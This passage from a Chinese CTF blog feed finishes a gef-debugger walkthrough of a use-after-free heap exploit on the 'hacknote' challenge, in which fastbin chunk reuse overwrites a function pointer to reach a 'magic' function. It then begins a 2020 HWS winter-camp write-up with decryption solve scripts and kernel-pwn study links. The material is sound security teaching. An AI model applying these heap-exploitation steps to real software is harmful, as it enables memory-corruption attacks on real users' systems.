<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eax   : 0x08a6a008  →  0x00000000</span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0xf7f2e780  →  0x00000000</span><br><span class="line">$edx   : 0x08a6a008  →  0x00000000</span><br><span class="line">$esp   : 0xffa50030  →  0x00000008</span><br><span class="line">$ebp   : 0xffa50068  →  0xffa50088  →  0x00000000</span><br><span class="line">$esi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffa50030│+0x0000: 0x00000008	 ← $esp</span><br><span class="line">0xffa50034│+0x0004: 0x00000000</span><br><span class="line">0xffa50038│+0x0008: 0xf7dadc75  →  &lt;strtol+5&gt; add eax, 0x18038b</span><br><span class="line">0xffa5003c│+0x000c: 0xf7dab070  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffa50040│+0x0010: 0xffa50078  →  0xffa50a31  →  0x00000000</span><br><span class="line">0xffa50044│+0x0014: 0x00000000</span><br><span class="line">0xffa50048│+0x0018: 0x0000000a</span><br><span class="line">0xffa5004c│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line">●→  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br><span class="line">    0x80486d2 &lt;add_note+92&gt;    mov    edx, eax</span><br><span class="line">    0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx</span><br><span class="line">    0x80486de &lt;add_note+104&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486e1 &lt;add_note+107&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x80486cf in add_note (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x80486cf → add_note()</span><br><span class="line">[#1] 0x8048ac5 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  heap chunk 0x08a6a008</span><br><span class="line">Chunk(addr&#x3D;0x8a6a008, size&#x3D;0x10, flags&#x3D;PREV_INUSE)</span><br><span class="line">Chunk size: 16 (0x10)</span><br><span class="line">Usable size: 12 (0xc)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>申请 note 0 的content 的地址为 0x08a6a018</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eax   : 0x08a6a018  →  0x00000000</span><br><span class="line">$ebx   : 0x08a6a008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0xf7f2e780  →  0x00000000</span><br><span class="line">$edx   : 0x08a6a018  →  0x00000000</span><br><span class="line">$esp   : 0xffa50030  →  0x00000020</span><br><span class="line">$ebp   : 0xffa50068  →  0xffa50088  →  0x00000000</span><br><span class="line">$esi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffa50030│+0x0000: 0x00000020	 ← $esp</span><br><span class="line">0xffa50034│+0x0004: 0xffa50054  →  0xf70a3233</span><br><span class="line">0xffa50038│+0x0008: 0x00000008</span><br><span class="line">0xffa5003c│+0x000c: 0xf7dab070  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffa50040│+0x0010: 0xffa50078  →  0xffa50a31  →  0x00000000</span><br><span class="line">0xffa50044│+0x0014: 0x00000000</span><br><span class="line">0xffa50048│+0x0018: 0x0000000a</span><br><span class="line">0xffa5004c│+0x001c: 0x00000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line">●→  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br><span class="line">    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax</span><br><span class="line">    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">    0x8048771 &lt;add_note+251&gt;   mov    eax, DWORD PTR [eax+0x4]</span><br><span class="line">    0x8048774 &lt;add_note+254&gt;   test   eax, eax</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x8048761 in add_note (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048761 → add_note()</span><br><span class="line">[#1] 0x8048ac5 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  heap chunk 0x08a6a018</span><br><span class="line">Chunk(addr&#x3D;0x8a6a018, size&#x3D;0x28, flags&#x3D;PREV_INUSE)</span><br><span class="line">Chunk size: 40 (0x28)</span><br><span class="line">Usable size: 36 (0x24)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure>

<p>类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x08a6a040 和 0x08a6a050。</p>
<p>同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  grep aaaa</span><br><span class="line">[+] Searching &#39;aaaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x8a6a000-0x8a8b000), permission&#x3D;rw-</span><br><span class="line">  0x8a6a018 - 0x8a6a01e  →   &quot;aaaa\n&quot; </span><br><span class="line">gef➤  grep ddaa</span><br><span class="line">[+] Searching &#39;ddaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x8a6a000-0x8a8b000), permission&#x3D;rw-</span><br><span class="line">  0x8a6a050 - 0x8a6a056  →   &quot;ddaa\n&quot; </span><br></pre></td></tr></table></figure>

<p>下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">●→  0x8048893 &lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">       0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push   0x20</span><br><span class="line">       0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp    0x8048480</span><br><span class="line">─────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">free@plt (</span><br><span class="line">   [sp + 0x0] &#x3D; 0x08a6a018 → &quot;aaaa\n&quot;,</span><br></pre></td></tr></table></figure>

<p>然后是 note0 本身</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">●→  0x80488a9 &lt;del_note+165&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">       0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push   0x20</span><br><span class="line">       0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp    0x8048480</span><br><span class="line">─────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">free@plt (</span><br><span class="line">   [sp + 0x0] &#x3D; 0x08a6a008 → 0x0804865b → &lt;print_note_content+0&gt; push ebp,</span><br></pre></td></tr></table></figure>

<p>当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">[+] No Tcache in this version of libc</span><br><span class="line">──────────────────────── Fastbins for arena 0xf7f2e780 ────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x10]  ←  Chunk(addr&#x3D;0x8a6a008, size&#x3D;0x10, flags&#x3D;PREV_INUSE) </span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x20] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x28]  ←  Chunk(addr&#x3D;0x8a6a050, size&#x3D;0x28, flags&#x3D;PREV_INUSE)  ←  Chunk(addr&#x3D;0x8a6a018, size&#x3D;0x28, flags&#x3D;PREV_INUSE) </span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x30] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x38] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x40] 0x00</span><br><span class="line">───────────────────── Unsorted Bin for arena &#39;*0xf7f2e780&#39; ─────────────────────</span><br><span class="line">[+] Found 0 chunks in unsorted bin.</span><br><span class="line">────────────────────── Small Bins for arena &#39;*0xf7f2e780&#39; ──────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────── Large Bins for arena &#39;*0xf7f2e780&#39; ──────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 large non-empty bins.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下</p>
<p><strong>申请 note2 对应的内存块为 0x08a6a040，其实就是 note1 对应的内存地址。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eax   : 0x08a6a040  →  0x08a6a000  →  0x00000000</span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0xf7f2e780  →  0x00000000</span><br><span class="line">$edx   : 0x08a6a040  →  0x08a6a000  →  0x00000000</span><br><span class="line">$esp   : 0xffa50030  →  0x00000008</span><br><span class="line">$ebp   : 0xffa50068  →  0xffa50088  →  0x00000000</span><br><span class="line">$esi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffa50030│+0x0000: 0x00000008	 ← $esp</span><br><span class="line">0xffa50034│+0x0004: 0x08048c63  →  &quot;Your choice :&quot;</span><br><span class="line">0xffa50038│+0x0008: 0xf7dadc75  →  &lt;strtol+5&gt; add eax, 0x18038b</span><br><span class="line">0xffa5003c│+0x000c: 0xf7dab070  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffa50040│+0x0010: 0xffa50078  →  0xffa50a31  →  0x00000000</span><br><span class="line">0xffa50044│+0x0014: 0x00000000</span><br><span class="line">0xffa50048│+0x0018: 0x0000000a</span><br><span class="line">0xffa5004c│+0x001c: 0x00000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line">●→  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br><span class="line">    0x80486d2 &lt;add_note+92&gt;    mov    edx, eax</span><br><span class="line">    0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx</span><br><span class="line">    0x80486de &lt;add_note+104&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486e1 &lt;add_note+107&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x80486cf in add_note (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x80486cf → add_note()</span><br><span class="line">[#1] 0x8048ac5 → main()</span><br></pre></td></tr></table></figure>

<p><strong>申请 note2 的 content 的内存地址为 0x08a6a008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eax   : 0x08a6a008  →  0x00000000</span><br><span class="line">$ebx   : 0x08a6a040  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0xf7f2e780  →  0x00000000</span><br><span class="line">$edx   : 0x08a6a008  →  0x00000000</span><br><span class="line">$esp   : 0xffa50030  →  0x00000008</span><br><span class="line">$ebp   : 0xffa50068  →  0xffa50088  →  0x00000000</span><br><span class="line">$esi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7f2e000  →  0x001afdb0</span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffa50030│+0x0000: 0x00000008	 ← $esp</span><br><span class="line">0xffa50034│+0x0004: 0xffa50054  →  0xf7e50a38  →  &lt;pwrite64+120&gt; hlt </span><br><span class="line">0xffa50038│+0x0008: 0x00000008</span><br><span class="line">0xffa5003c│+0x000c: 0xf7dab070  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffa50040│+0x0010: 0xffa50078  →  0xffa50a31  →  0x00000000</span><br><span class="line">0xffa50044│+0x0014: 0x00000000</span><br><span class="line">0xffa50048│+0x0018: 0x0000000a</span><br><span class="line">0xffa5004c│+0x001c: 0x00000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line">●→  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br><span class="line">    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax</span><br><span class="line">    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">    0x8048771 &lt;add_note+251&gt;   mov    eax, DWORD PTR [eax+0x4]</span><br><span class="line">    0x8048774 &lt;add_note+254&gt;   test   eax, eax</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x8048761 in add_note (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048761 → add_note()</span><br><span class="line">[#1] 0x8048ac5 → main()</span><br></pre></td></tr></table></figure>

<p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x&#x2F;2xw 0x08a6a008</span><br><span class="line">0x8a6a008:	0x00000000	0x08a6a018</span><br></pre></td></tr></table></figure>

<p>覆盖后，具体的值如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x&#x2F;2xw 0x08a6a008</span><br><span class="line">0x8a6a008:	0x08048986	0x08a6a00a</span><br><span class="line">gef➤  x&#x2F;i 0x08048986</span><br><span class="line">   0x8048986 &lt;magic&gt;:	push   ebp</span><br></pre></td></tr></table></figure>

<p>最后执行效果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;hacknote&#39;: pid 3232</span><br><span class="line">[*] running in new terminal: &#x2F;usr&#x2F;bin&#x2F;gdb -q  &quot;.&#x2F;hacknote&quot; 3232</span><br><span class="line">[-] Waiting for debugger: debugger exited! (maybe check &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;use_after_free&#125;----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>

<p>同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  heap-analysis-helper</span><br><span class="line">[*] This feature is under development, expect bugs and unstability...</span><br><span class="line">[+] Tracking malloc() &amp; calloc()</span><br><span class="line">[+] Tracking free()</span><br><span class="line">[+] Tracking realloc()</span><br><span class="line">[+] Disabling hardware watchpoints (this may increase the latency)</span><br><span class="line">[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</span><br><span class="line">[*] Note: The heap analysis slows down the execution noticeably.</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(8)&#x3D;0x9bba008</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(8)&#x3D;0x9bba008</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(32)&#x3D;0x9bba018</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(8)&#x3D;0x9bba040</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(32)&#x3D;0x9bba050</span><br><span class="line">[+] Heap-Analysis - free(0x9bba018)</span><br><span class="line">[+] Heap-Analysis - free(0x9bba008)</span><br><span class="line">[+] Heap-Analysis - free(0x9bba050)</span><br><span class="line">[+] Heap-Analysis - free(0x9bba040)</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(8)&#x3D;0x9bba040</span><br><span class="line">[+] Heap-Analysis - __libc_malloc(8)&#x3D;0x9bba008</span><br></pre></td></tr></table></figure>

<p>这里第一个输出了两次，应该是 gef 工具的问题。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul>
<li>2016 HCTF fheap</li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>UAF</tag>
        <tag>PWN</tag>
        <tag>Glibc Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-HWS-冬令营线上赛WP</title>
    <url>/2021/02/13/CTF/HWS/2020-HWS-%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BA%BF%E4%B8%8A%E8%B5%9BWP/</url>
    <content><![CDATA[<blockquote>
<p>本次线上赛赛题只有四类：固件、内核、逆向、Pwn。比赛完参考轩哥和线上师傅的博客进行复现，其中固件题目与IoT实战结合紧密，难度总体来说不大，入门友好型赛题。</p>
</blockquote>
<ul>
<li>HWS冬令营介绍：<a href="https://mp.weixin.qq.com/s/9FNjVBNZAElZGrPxtsX19A">HWS计划2021硬件安全冬令营重磅回归！</a></li>
<li>入营赛题目附件：<a href="https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip">HWS20210128.zip</a></li>
</ul>
<a id="more"></a>

<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h2><blockquote>
<p>x86windows</p>
<p>考点：</p>
<p>加法的位运算实现</p>
<p>单子节爆破</p>
</blockquote>
<p>主要加密逻辑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 31; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v2 &#x3D; i ^ a2[i];</span><br><span class="line">  v3 &#x3D; i &amp; a2[i];</span><br><span class="line">  v7 &#x3D; a2[i];</span><br><span class="line">  v6 &#x3D; i;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; 2 * (v6 &amp; v7);</span><br><span class="line">    v7 ^&#x3D; v6;</span><br><span class="line">    v6 &#x3D; v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 );</span><br><span class="line">  result &#x3D; &amp;a1[i];</span><br><span class="line">  a1[i] &#x3D; v7 ^ 0x23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>加密算法无法一眼看出对应的运算，直接写脚本进行爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf = [<span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0x10</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x5E</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0xA1</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0xA3</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">        v6 = i</span><br><span class="line">        v7 = j</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            v4 = <span class="number">2</span> * (v6 &amp; v7)</span><br><span class="line">            v7 = v7 ^ v6</span><br><span class="line">            v6 = v4</span><br><span class="line">            <span class="keyword">if</span> v4 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> v7 ^ <span class="number">0x23</span> == buf[i]:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> % flag)</span><br></pre></td></tr></table></figure>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果了解过加法的位运算实现的话，可以发现encrypt函数实际上是把对应input[i]加上i在异或，我们可以写出对应的逆运算：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">char decrypt(char c1,int i)&#123;</span><br><span class="line">    return (c1 ^ 0x23) - i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[40] &#x3D; &quot;\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x52\x66\x1D\x52\x66\x67\x68\x67\x65\x6F\x5F\x59\x58\x5E\x6D\x70\xA1\x6E\x70\xA3&quot;;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 32; i++)&#123;</span><br><span class="line">        putchar(decrypt(buf[i],i));</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ofbu"><a href="#ofbu" class="headerlink" title="ofbu"></a>ofbu</h2><h1 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h1><p>第一次做内核，基础学习文章如下：</p>
<ul>
<li><a href="https://lantern.cool/note-pwn-kernel-basics/">Linux Kernel Basics</a></li>
<li><a href="https://beafb1b1.github.io/kernel/linux_kernel_base/">linux内核基础</a></li>
<li><a href="https://lantern.cool/note-pwn-kernel-environment/">Linux Kernel 环境配置及调试</a></li>
<li><a href="https://bbs.pediy.com/thread-261586.htm">Linux Kernel Pwn 学习笔记(栈溢出)</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/08/24/gdb/">HWS夏令营 之 GDB调一切: 调试linux内核</a></li>
</ul>
<p>基础练习题目如下：</p>
<ul>
<li>练习文章：<a href="https://xz.aliyun.com/t/7625">Linux Kernel Pwn 初探</a></li>
<li>配套题目：链接:<a href="https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA">https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA</a> 密码:q58k</li>
</ul>
<p>进阶练习题目如下：ISCN2017 - babydriver、2018 强网杯 - core、2018 0CTF Finals Baby Kernel</p>
<ul>
<li><a href="https://lantern.cool/note-pwn-kernel-UAF/">Linux Kernel UAF <strong>CISCN2017 - babydriver</strong></a></li>
<li><a href="https://lantern.cool/note-pwn-kernel-smep/">Linux Kernel bypass-smep <strong>CISCN2017 - babydriver</strong></a></li>
<li><a href="https://lantern.cool/note-pwn-kernel-rop/">Linux Kernel ROP <strong>2018 强网杯 - core</strong></a></li>
<li><a href="https://lantern.cool/note-pwn-kernel-ret2usr/">Linux Kernel ret2usr <strong>2018 强网杯 - core</strong></a></li>
<li><a href="https://lantern.cool/note-pwn-kernel-double-fetch/">Linux Kernel Double Fetch <strong>2018 0CTF Finals Baby Kernel</strong></a></li>
</ul>
<h2 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h2><p>逻辑总共为4个步骤</p>
<ol>
<li>输入flag</li>
<li>加载驱动，调用驱动中的函数加密flag</li>
<li>长调用，加密密文</li>
<li>Check，对比结果</li>
</ol>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114311164.png" alt="image-20210304114311164"></p>
<h3 id="驱动调用"><a href="#驱动调用" class="headerlink" title="驱动调用"></a>驱动调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114327405.png" alt="image-20210304114327405"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304113617543.png" alt="image-20210304113617543"></p>
<h3 id="查看驱动"><a href="#查看驱动" class="headerlink" title="查看驱动"></a>查看驱动</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114358052.png" alt="image-20210304114358052"></p>
<p><strong>最终调用的加密函数是驱动的sub_401340</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114503572.png" alt="image-20210304114503572"></p>
